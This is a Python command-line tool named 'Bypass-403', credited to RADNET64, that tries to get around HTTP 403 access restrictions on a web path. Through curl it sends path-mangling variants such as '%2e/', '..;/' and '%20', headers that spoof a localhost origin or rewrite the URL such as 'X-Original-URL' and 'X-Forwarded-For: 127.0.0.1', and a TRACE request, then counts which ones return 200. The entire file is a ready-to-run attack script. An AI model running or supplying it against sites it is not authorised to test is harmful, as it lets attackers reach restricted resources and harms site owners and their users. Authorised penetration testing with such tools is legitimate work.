import argparse
import subprocess

def print_colored(message, color_code):
    print(f"\033[{color_code}m{message}\033[0m")

def run_curl(url, path, headers=None, method="GET"):
    curl_cmd = ["curl", "-k", "-s", "-o", "/dev/null", "-iL", "-w", "%{http_code},%{size_download}"]
    
    if headers:
        for header in headers:
            curl_cmd.extend(["-H", header])
    if method:
        curl_cmd.extend(["-X", method])
    
    curl_cmd.append(f"{url}/{path}")
    
    result = subprocess.run(curl_cmd, capture_output=True, text=True)
    http_code, size_download = result.stdout.split(',')
    success = False

    if http_code == "200":
        color = "32"  # Green
        success = True
    elif http_code in ["301", "302"]:
        color = "33"  # Yellow
    else:
        color = "31"  # Red
    
    print_colored(f"  --> {url}/{path} {' '.join(['-H ' + h for h in headers]) if headers else ''} {'-X ' + method if method else ''}", "34")  # Blue for info
    print_colored(f"      {http_code}, {size_download}", color)
    
    return success

def main():
    parser = argparse.ArgumentParser(description="Bypass-403 Script")
    parser.add_argument("url", help="Base URL")
    parser.add_argument("path", help="Path to check")
    args = parser.parse_args()

    print_colored("Bypass-403", "34")  # Blue for info
    print_colored("By RADNET64", "34")  # Blue for info
    print_colored(f"./bypass-403.py {args.url} {args.path}\n", "34")  # Blue for info

    variations = [
        "",
        "%2e/",
        "/.",
        "//",
        "/./",
        "%20",
        "%09",
        "?",
        ".html",
        "/?anything",
        "#",
        "/*",
        ".php",
        ".json",
        "..;/",
        ";/"
    ]

    headers = [
        "X-Original-URL: " + args.path,
        "X-Custom-IP-Authorization: 127.0.0.1",
        "X-Forwarded-For: http://127.0.0.1",
        "X-Forwarded-For: 127.0.0.1:80",
        "X-rewrite-url: " + args.path,
        "X-Host: 127.0.0.1",
        "X-Forwarded-Host: 127.0.0.1"
    ]

    success_count = 0
    fail_count = 0

    for variation in variations:
        if run_curl(args.url, f"{args.path}{variation}"):
            success_count += 1
        else:
            fail_count += 1

    for header in headers:
        if run_curl(args.url, args.path, headers=[header]):
            success_count += 1
        else:
            fail_count += 1
    
    if run_curl(args.url, args.path, method="TRACE"):
        success_count += 1
    else:
        fail_count += 1

    print_colored(f"\nSuccess: {success_count}", "32")  # Green for success
    print_colored(f"Fail: {fail_count}", "31")  # Red for fail

if __name__ == "__main__":
    main()
